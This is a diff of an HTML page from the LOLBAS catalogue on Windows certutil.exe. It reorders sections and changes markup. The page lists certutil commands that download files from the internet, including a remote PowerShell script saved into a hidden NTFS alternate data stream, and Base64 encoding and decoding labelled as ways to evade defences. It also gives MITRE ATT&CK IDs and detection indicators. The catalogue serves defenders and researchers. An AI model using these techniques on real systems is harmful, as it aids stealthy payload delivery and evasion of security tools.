@@ -28,24 +28,28 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Binaries/Certutil/#download">Download</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Certutil/#encode">Encode</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Certutil/#decode">Decode</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Certutil/#ads">Alternate data streams</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Binaries/Certutil/#download">Download</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Certutil/#ads">Alternate data streams</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Certutil/#encode">Encode</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Certutil/#decode">Decode</a></li>
+	
 </ul>
 
+	
+
 <p>Windows binary used for handeling certificates</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -59,158 +63,119 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://twitter.com/Moriarty_Meng/status/984380793383370752">https://twitter.com/Moriarty_Meng/status/984380793383370752</a></li>
+	<a href="https://twitter.com/Moriarty_Meng/status/984380793383370752">https://twitter.com/Moriarty_Meng/status/984380793383370752</a>
+	<br>
 	
-	<li><a href="https://twitter.com/mattifestation/status/620107926288515072">https://twitter.com/mattifestation/status/620107926288515072</a></li>
+	<a href="https://twitter.com/mattifestation/status/620107926288515072">https://twitter.com/mattifestation/status/620107926288515072</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>Matt Graeber - <a href="https://twitter.com/@mattifestation">@mattifestation</a </li>
+	Matt Graeber - <a href="https://twitter.com/@mattifestation">@mattifestation</a>
+	<br>
 	
-	<li>Moriarty - <a href="https://twitter.com/@moriarty2016">@moriarty2016</a </li>
+	Moriarty - <a href="https://twitter.com/@moriarty2016">@moriarty2016</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li>Certutil.exe creating new files on disk</li>
+	Certutil.exe creating new files on disk
+	<br>
 	
-	<li>Useragent Microsoft-CryptoAPI/10.0</li>
+	Useragent Microsoft-CryptoAPI/10.0
+	<br>
 	
-	<li>Useragent CertUtil URL Agent</li>
+	Useragent CertUtil URL Agent
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="download" class="function-name">Download</h2>
-
-<p>The LOLBAS can download files.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Download and save 7zip to disk in the current folder.</p>
-
+	
+<h2 id="download" class ="function-name">Download</h2>
+	
+		Download and save 7zip to disk in the current folder.
+		<br>
+		<pre><code>certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe</code></pre>
 		Usecase:Download file from Internet
-        <pre><code>certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="encode" class="function-name">Encode</h2>
-
-<p>The LOLBAS can encode files.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Command to encode a file using Base64</p>
-
-		Usecase:Encode files to evade defensive measures
-        <pre><code>certutil -encode inputFileName encodedOutputFileName</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1027">T1027</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="decode" class="function-name">Decode</h2>
-
-<p>The LOLBAS can decode files.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Command to decode a Base64 encoded file.</p>
-
-		Usecase:Decode files to evade defensive measures
-        <pre><code>certutil -decode encodedInputFileName decodedOutputFileName</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1140">T1140</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="ads" class="function-name">Alternate data streams</h2>
-
-<p>The LOLBAS can write or read alternate data streams.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Download and save a PS1 file to an Alternate Data Stream (ADS).</p>
-
+	
+<h2 id="ads" class ="function-name">Alternate data streams</h2>
+	
+		Download and save a PS1 file to an Alternate Data Stream (ADS).
+		<br>
+		<pre><code>certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt</code></pre>
 		Usecase:Download file from Internet and save it in an NTFS Alternate Data Stream
-        <pre><code>certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
+	
+<h2 id="encode" class ="function-name">Encode</h2>
+	
+		Command to encode a file using Base64
+		<br>
+		<pre><code>certutil -encode inputFileName encodedOutputFileName</code></pre>
+		Usecase:Encode files to evade defensive measures
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1027">T1027</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+
+	
+<h2 id="decode" class ="function-name">Decode</h2>
+	
+		Command to decode a Base64 encoded file.
+		<br>
+		<pre><code>certutil -decode encodedInputFileName decodedOutputFileName</code></pre>
+		Usecase:Decode files to evade defensive measures
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1140">T1140</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
